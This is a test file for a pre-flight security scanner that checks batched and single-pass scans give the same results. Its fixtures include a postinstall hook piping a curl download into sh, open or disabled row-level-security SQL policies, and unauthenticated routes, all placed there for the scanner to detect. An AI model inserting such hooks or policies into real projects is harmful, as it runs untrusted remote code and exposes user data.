// Cross-file probe batching (finalread-cross-file-probe-batching-spec.md §7).
//
// Batched scans hand the engine 2 files at a time, so any probe whose truth
// depends on the file set as a whole can misfire on a partial set. These
// tests drive runPreFlightScan with the batched path forced (singlePassBytes: 1)
// and assert the cross-file pass + batch filter + hybrid gates reproduce the
// single-pass verdicts.
import { describe, it, expect } from "vitest";
import {
  runPreFlightScan,
  CROSS_FILE_FINDING_ID_PREFIXES,
  PASS_PROBE_PER_FILE_ID_PREFIXES,
} from "../server/preflight-scan";
import { scan } from "../server/preflight/vendor/lib/cockpit-scan.js";
import {
  probePackageJson,
  probeNpmrcHygiene,
} from "../server/preflight/vendor/lib/probes/supply-chain.js";
import { probeArchitecture } from "../server/preflight/vendor/lib/probes/quality.js";
import { probeMissingHeaders } from "../server/preflight/vendor/lib/probes/transport.js";
import { probeHostDetection } from "../server/preflight/vendor/lib/probes/v2/context.js";
import { probeSupabaseRLS } from "../server/preflight/vendor/lib/probes/database.js";
import {
  probeExternalURLs,
  probeGEOHygiene,
  probeSEOHygiene,
} from "../server/preflight/vendor/lib/probes/web.js";
import {
  probeAPIRouteAuth,
  probeAdminRoutes,
} from "../server/preflight/vendor/lib/probes/auth.js";

const f = (path: string, content: string) => ({ path, content });
const titles = (r: { findings: { title: string }[] }) =>
  r.findings.map((x) => x.title);
const hasTitle = (r: { findings: { title: string }[] }, needle: string) =>
  titles(r).some((t) => t.includes(needle));
const countTitle = (r: { findings: { title: string }[] }, needle: string) =>
  titles(r).filter((t) => t.includes(needle)).length;
// Test seam: force the batched path regardless of fixture size.
const BATCHED = { singlePassBytes: 1 };

const PKG_MAIN_MISSING = JSON.stringify({
  name: "demo",
  version: "1.0.0",
  main: "server.ts",
  dependencies: { react: "^18.0.0" },
});

describe("entry-point finding", () => {
  it("fires when the entry point is genuinely missing (batched)", () => {
    const r = runPreFlightScan([f("package.json", PKG_MAIN_MISSING)], scan, BATCHED);
    expect(hasTitle(r, "not in the scan set")).toBe(true);
  });

  it("does not fire when the entry point is in another batch", () => {
    // The controlled experiment (spec §7a): package.json and server.ts sort
    // into different 2-file batches because roadmap.md sits between them.
    const files = [
      f("package.json", PKG_MAIN_MISSING),
      f("roadmap.md", "# Roadmap\n\nPlanned features.\n"),
      f("server.ts", "console.log('up');\n"),
    ];
    const batched = runPreFlightScan(files, scan, BATCHED);
    expect(hasTitle(batched, "not in the scan set")).toBe(false);
    // Same set single-pass: no finding either (the pass must match it).
    const single = runPreFlightScan(files, scan);
    expect(hasTitle(single, "not in the scan set")).toBe(false);
  });
});

describe(".npmrc hygiene", () => {
  it("fires when .npmrc is genuinely missing (batched)", () => {
    const r = runPreFlightScan([f("package.json", PKG_MAIN_MISSING)], scan, BATCHED);
    expect(hasTitle(r, ".npmrc with security defaults not found")).toBe(true);
  });

  it("does not fire when .npmrc is in another batch", () => {
    const files = [
      f("package.json", PKG_MAIN_MISSING),
      f("notes.txt", "filler to split the batches\n"),
      f(".npmrc", "ignore-scripts=true\n"),
    ];
    const r = runPreFlightScan(files, scan, BATCHED);
    expect(hasTitle(r, ".npmrc with security defaults not found")).toBe(false);
    expect(hasTitle(r, "No install-time supply-chain control in .npmrc")).toBe(false);
  });
});

describe("architecture equivalence", () => {
  const monolith = [
    f(
      "package.json",
      JSON.stringify({ name: "demo", dependencies: { react: "^18.0.0" } })
    ),
    f("src/App.tsx", Array(1600).fill("const x = 1;").join("\n") + "\n"),
  ];

  it("classifies a split monolithic SPA the same batched and single-pass", () => {
    const batched = runPreFlightScan(monolith, scan, BATCHED);
    const single = runPreFlightScan(monolith, scan);
    expect(hasTitle(batched, "consider splitting")).toBe(true);
    expect(hasTitle(batched, "Detected: Monolithic SPA")).toBe(true);
    // The whole report must agree, not just the architecture titles: the
    // pass is the only source of cross-file findings in batched mode.
    expect([...titles(batched)].sort()).toEqual([...titles(single)].sort());
  });
});

describe("hybrid gates", () => {
  const expressRoute = [
    f(
      "server.ts",
      "import express from 'express';\nconst app = express();\napp.get('/api/users', (req, res) => { res.json([]); });\n"
    ),
  ];
  const middleware = f(
    "middleware.ts",
    "export default auth((req) => { return; });\n"
  );
  const destructiveRoute = [
    f(
      "src/app/api/items/route.ts",
      "export async function DELETE(req: Request) {\n  return Response.json({ ok: true });\n}\n"
    ),
  ];
  const adminPage = [
    f(
      "src/app/admin/page.tsx",
      "import { useUser } from '@clerk/nextjs';\nexport default function AdminPage() {\n  const { user } = useUser();\n  return <div>Admin {user?.id}</div>;\n}\n"
    ),
  ];
  const seoFiles = [
    f(
      "index.html",
      '<!DOCTYPE html><html><head><meta charset="utf-8"></head><body><div id="root"></div></body></html>\n'
    ),
    f("robots.txt", "User-agent: *\nAllow: /\n"),
  ];
  const pwaFiles = [
    f("manifest.json", JSON.stringify({ name: "demo", display: "standalone" })),
    f("sw.js", "self.addEventListener('install', () => {});\n"),
  ];

  it("keeps per-route auth findings when no middleware exists anywhere", () => {
    const r = runPreFlightScan(expressRoute, scan, BATCHED);
    expect(hasTitle(r, "without auth check")).toBe(true);
    // The probe's own gate agrees: it fires on the same full set.
    expect(probeAPIRouteAuth(expressRoute).some((x) => x.id.startsWith("api-noauth-"))).toBe(true);
  });

  it("drops per-route auth findings when a middleware file exists in another batch", () => {
    const files = [...expressRoute, f("notes.txt", "filler\n"), middleware];
    const r = runPreFlightScan(files, scan, BATCHED);
    expect(hasTitle(r, "without auth check")).toBe(false);
    // The probe's own gate agrees: it emits nothing on the same full set.
    expect(probeAPIRouteAuth(files)).toEqual([]);
  });

  it("drops per-route auth findings on app-wide app.use(authMiddleware)", () => {
    const files = [
      ...expressRoute,
      f("notes.txt", "filler\n"),
      f("app.ts", "import express from 'express';\nconst app = express();\napp.use(authMiddleware);\n"),
    ];
    const r = runPreFlightScan(files, scan, BATCHED);
    expect(hasTitle(r, "without auth check")).toBe(false);
    expect(probeAPIRouteAuth(files)).toEqual([]);
  });

  it("drops destructive-handler findings under the same gate", () => {
    const ungated = runPreFlightScan(destructiveRoute, scan, BATCHED);
    expect(hasTitle(ungated, "Destructive HTTP handler")).toBe(true);
    expect(
      probeAPIRouteAuth(destructiveRoute).some((x) => x.id.startsWith("api-destructive-"))
    ).toBe(true);
    const gated = runPreFlightScan([...destructiveRoute, f("notes.txt", "filler\n"), middleware], scan, BATCHED);
    expect(hasTitle(gated, "Destructive HTTP handler")).toBe(false);
    expect(probeAPIRouteAuth([...destructiveRoute, middleware])).toEqual([]);
  });

  it("drops admin client-only findings when a middleware file exists in another batch", () => {
    const ungated = runPreFlightScan(adminPage, scan, BATCHED);
    expect(hasTitle(ungated, "client-side auth check only")).toBe(true);
    expect(probeAdminRoutes(adminPage).some((x) => x.id.startsWith("admin-clientonly-"))).toBe(true);
    const gated = runPreFlightScan([...adminPage, f("notes.txt", "filler\n"), middleware], scan, BATCHED);
    expect(hasTitle(gated, "client-only")).toBe(false);
    expect(probeAdminRoutes([...adminPage, middleware])).toEqual([]);
  });

  it("drops SEO findings for a private installable PWA, keeps them otherwise", () => {
    const plain = runPreFlightScan(seoFiles, scan, BATCHED);
    expect(hasTitle(plain, "Sitemap")).toBe(true);
    expect(probeSEOHygiene(seoFiles).length).toBeGreaterThan(0);
    const pwa = runPreFlightScan([...seoFiles, ...pwaFiles], scan, BATCHED);
    expect(hasTitle(pwa, "Sitemap")).toBe(false);
    expect(probeSEOHygiene([...seoFiles, ...pwaFiles])).toEqual([]);
  });
});

describe("tier-2 dedup and cost guard", () => {
  const pkgWithHooks = f(
    "package.json",
    JSON.stringify({
      name: "demo",
      version: "1.0.0",
      main: "server.ts",
      scripts: { postinstall: "curl https://example.com/install.sh | sh" },
      dependencies: { floating: "latest" },
    })
  );

  it("emits per-file pass-probe findings exactly once (pass, not batch)", () => {
    const r = runPreFlightScan([pkgWithHooks, f("server.ts", "console.log('up');\n")], scan, BATCHED);
    expect(countTitle(r, "Suspicious install hook detected")).toBe(1);
    expect(countTitle(r, "Unpinned dependency version")).toBe(1);
  });

  it("abandons the pass on a zero budget, records it, and still applies tier 1", () => {
    const files = [
      f("package.json", PKG_MAIN_MISSING),
      f("roadmap.md", "# Roadmap\n"),
      f("server.ts", "console.log('up');\n"),
    ];
    const r = runPreFlightScan(files, scan, { singlePassBytes: 1, crossFilePassBudgetMs: 0 });
    expect(r.probeFailures.some((p) => p.probe === "cross-file-pass")).toBe(true);
    // Tier 1 still applies even though the pass did not run: the split
    // entry point must not be reported as missing.
    expect(hasTitle(r, "not in the scan set")).toBe(false);
    // Tier 2 does NOT apply when the pass did not run: the batch copy of a
    // per-file finding is kept, not dropped.
    const hooks = runPreFlightScan(
      [pkgWithHooks, f("server.ts", "console.log('up');\n")],
      scan,
      { singlePassBytes: 1, crossFilePassBudgetMs: 0 }
    );
    expect(hasTitle(hooks, "Suspicious install hook detected")).toBe(true);
  });
});

describe("single-pass unchanged", () => {
  it("runs no pass and records no cross-file failure on a small repo", () => {
    const files = [
      f("package.json", PKG_MAIN_MISSING),
      f("server.ts", "console.log('up');\n"),
    ];
    const r = runPreFlightScan(files, scan);
    expect(r.failed).toBeNull();
    expect(r.probeFailures.some((p) => p.probe === "cross-file-pass")).toBe(false);
    expect(hasTitle(r, "not in the scan set")).toBe(false);
    // The single-pass report is the engine's own output, mapped: same
    // non-Opengrep titles, same count.
    const engineTitles = scan(files).findings.map((x: any) => x.title).sort();
    const adapterTitles = r.findings
      .filter((x) => x.probe !== "Opengrep")
      .map((x) => x.title)
      .sort();
    expect(adapterTitles).toEqual(engineTitles);
  });
});

describe("id-prefix contract", () => {
  // Every prefix in the audit table must match at least one id the pass
  // probes actually emit, and every id the pass probes emit must be covered
  // by a listed prefix — otherwise the batch filter would either drop a
  // finding it cannot re-emit or pass through a cross-file finding it
  // should have dropped.
  const PASS_PROBES = [
    probePackageJson,
    probeArchitecture,
    probeNpmrcHygiene,
    probeMissingHeaders,
    probeHostDetection,
    probeSupabaseRLS,
    probeExternalURLs,
    probeGEOHygiene,
  ];

  const kitchenSink = [
    f(
      "package.json",
      JSON.stringify({
        name: "demo",
        version: "1.0.0",
        main: "server.ts",
        scripts: { postinstall: "curl https://example.com/install.sh | sh" },
        dependencies: {
          react: "^18.0.0",
          local: "file:../local",
          floating: "latest",
          "@supabase/supabase-js": "^2.0.0",
        },
      })
    ),
    f("src/App.tsx", Array(1600).fill("const x = 1;").join("\n") + "\n"),
    f(
      "index.html",
      '<!DOCTYPE html><html><head><script type="application/ld+json">{"@type": "FAQPage"}</script></head><body><div id="root"></div><a href="https://example.com">ext</a></body></html>\n'
    ),
    f("robots.txt", "User-agent: GPTBot\nDisallow: /\n"),
    f(
      "src/lib/data.ts",
      "import { createClient } from '@supabase/supabase-js';\nconst supabase = createClient('https://x.supabase.co', 'key');\nexport async function getProfiles() {\n  const { data } = await supabase.from('profiles').select('*');\n  return data;\n}\n"
    ),
    // A suspicious host (private RFC 1918 IP) is what probeExternalURLs
    // flags; a plain https://example.com link is safe-listed and fires nothing.
    f("src/api.ts", "export const API = 'http://192.168.1.10:8080/api';\nfetch(API);\n"),
    f(
      "migrations/001.sql",
      "CREATE TABLE profiles (id uuid primary key, user_id uuid);\n" +
        "CREATE TABLE orders (id uuid primary key);\n" +
        "CREATE POLICY \"open\" ON public.profiles FOR SELECT USING (true);\n" +
        "CREATE POLICY \"open-insert\" ON public.profiles FOR INSERT WITH CHECK (true);\n" +
        "ALTER TABLE orders DISABLE ROW LEVEL SECURITY;\n" +
        "CREATE OR REPLACE FUNCTION is_admin() RETURNS boolean LANGUAGE sql SECURITY DEFINER AS $$ SELECT true $$;\n" +
        "CREATE POLICY \"admin-only\" ON public.orders FOR SELECT USING (is_admin());\n"
    ),
    f(".replit", "run = \"npm start\"\n"),
  ];
  const bareNpmrc = [
    f("package.json", JSON.stringify({ name: "demo", version: "1.0.0" })),
    f(".npmrc", "registry=https://registry.npmjs.org/\n"),
  ];
  const staticHtml = [
    f(
      "index.html",
      '<!DOCTYPE html><html><head><title>t</title></head><body><div id="root"></div></body></html>\n'
    ),
  ];
  const monorepo = [
    f("package.json", JSON.stringify({ name: "root", private: true })),
    f("packages/a/package.json", JSON.stringify({ name: "a", version: "1.0.0" })),
    f("packages/b/package.json", JSON.stringify({ name: "b", version: "1.0.0" })),
  ];
  const nextStaticExport = [
    f(
      "package.json",
      JSON.stringify({ name: "demo", dependencies: { next: "^14.0.0" } })
    ),
    f(
      "next.config.js",
      "module.exports = { output: 'export', async headers() { return []; } };\n"
    ),
  ];
  const nextNoHeaders = [
    f(
      "package.json",
      JSON.stringify({ name: "demo", dependencies: { next: "^14.0.0" } })
    ),
    f("next.config.js", "module.exports = { output: 'standalone' };\n"),
  ];
  // A host config file with no headers is the static source the per-header
  // findings are attributed to (probeMissingHeaders stage 3).
  const hostConfig = [f("vercel.json", "{}\n")];

  it("every listed prefix matches an emitted id, and every emitted id is listed", () => {
    const sets = [kitchenSink, bareNpmrc, staticHtml, monorepo, nextStaticExport, nextNoHeaders, hostConfig];
    const emitted = new Set<string>();
    for (const set of sets) {
      for (const probe of PASS_PROBES) {
        for (const finding of probe(set)) {
          expect(typeof finding.id).toBe("string");
          emitted.add(finding.id);
        }
      }
    }
    const allPrefixes = [...CROSS_FILE_FINDING_ID_PREFIXES, ...PASS_PROBE_PER_FILE_ID_PREFIXES];
    const matches = (id: string, p: string) => (p.endsWith("-") ? id.startsWith(p) : id === p);
    for (const p of allPrefixes) {
      expect(
        [...emitted].some((id) => matches(id, p)),
        `prefix ${p} matches no emitted id (emitted: ${[...emitted].sort().join(", ")})`
      ).toBe(true);
    }
    for (const id of emitted) {
      expect(
        allPrefixes.some((p) => matches(id, p)),
        `emitted id ${id} is covered by no listed prefix`
      ).toBe(true);
    }
  });
});
